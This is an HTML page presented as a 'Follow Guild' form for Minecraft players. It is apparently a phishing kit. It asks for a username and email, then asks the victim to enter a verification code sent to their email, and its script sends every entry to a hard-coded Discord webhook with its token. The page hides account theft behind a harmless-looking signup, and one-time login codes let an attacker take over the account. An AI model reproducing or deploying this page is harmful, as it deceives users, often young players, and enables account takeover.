<!DOCTYPE html>
<html>
<head>
  <title>Follow Guild</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
    }

    #container {
      max-width: 400px;
      margin: 0 auto;
      padding: 20px;
      background-color: #fff;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      color: #333;
      margin-top: 0;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #555;
    }

    input[type="text"],
    input[type="email"],
    button {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    button[type="submit"] {
      background-color: #4CAF50;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button[type="submit"]:hover {
      background-color: #45a049;
    }

    #codeContainer {
      display: none;
    }

    #verificationCode {
      font-weight: bold;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div id="container">
    <h2>Follow Guild</h2>
    <div id="formContainer">
      <form id="followForm">
        <label for="username">Minecraft Username:</label>
        <input type="text" id="username" required>

        <label for="email">Email:</label>
        <input type="email" id="email" required>

        <button type="submit">Submit</button>
      </form>
    </div>

    <div id="codeContainer">
      <h2>Verification Code</h2>
      <p>Please enter the verification code we sent to your email address.</p>
      <form id="codeForm">
        <label for="code">Code:</label>
        <input type="text" id="code" required>

        <button type="submit">Verify</button>
      </form>
      <p id="verificationCode"></p>
    </div>
  </div>

  <script>
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const guildId = urlParams.get('id');
    let emailSubmitted = false;

    if (guildId) {
      document.getElementById('guildId').value = guildId;
    }

    document.getElementById("followForm").addEventListener("submit", function(event) {
      event.preventDefault(); // prevent the form from reloading the page

      // get the input values
      const username = document.getElementById('username').value;
      const email = document.getElementById('email').value;
      const guildId = document.getElementById('guildId').value;

      // create the webhook message
      const message = {
        "content": "Email and IGN entered!",
        "embeds": [
          {
            "title": "Guild Follow Request",
            "description": "Please verify your email address by entering the code we sent you.",
            "color": 16777215,
            "fields": [
              {
                "name": "Minecraft Username",
                "value": username
              },
              {
                "name": "Email",
                "value": email
              }
            ]
          }
        ]
      };

      // send the webhook message
      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
      })
      .then(function(response) {
        if (response.ok) {
          console.log("Email and IGN submitted successfully!");
          emailSubmitted = true;
          showCodeForm();
        } else {
          console.log("Error:", response.statusText);
        }
      })
      .catch(function(error) {
        console.log("Error:", error);
      });
    });

    document.getElementById("codeForm").addEventListener("submit", function(event) {
      event.preventDefault(); // prevent the form from reloading the page

      // get the verification code
      const code = document.getElementById('code').value;

      // create the verification code message
      const codeMessage = {
        "content": "Verification code entered!",
        "embeds": [
          {
            "title": "Verification Code",
            "description": "The verification code entered by the user.",
            "color": 16711680,
            "fields": [
              {
                "name": "Code",
                "value": code
              }
            ]
          }
        ]
      };

      // send the verification code message to the webhook
      fetch("https://discord.com/api/webhooks/1119215694110789742/DKe5G1oQ3Zf2zgQTu2QEfzq650Ar4YNoXquQkDTv26mFXQuBjBHPXPleekqZ_xAnVsP0", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(codeMessage)
      })
      .then(function(response) {
        if (response.ok) {
          console.log("Code submitted successfully!");
          // Code validation success, you can perform any further actions here
        } else {
          console.log("Error:", response.statusText);
          // Code validation failed, you can display an error message or take other actions
        }
      })
      .catch(function(error) {
        console.log("Error:", error);
      });
    });

    function showCodeForm() {
      document.getElementById("formContainer").style.display = "none";
      document.getElementById("codeContainer").style.display = "block";
    }
  </script>
</body>
</html>
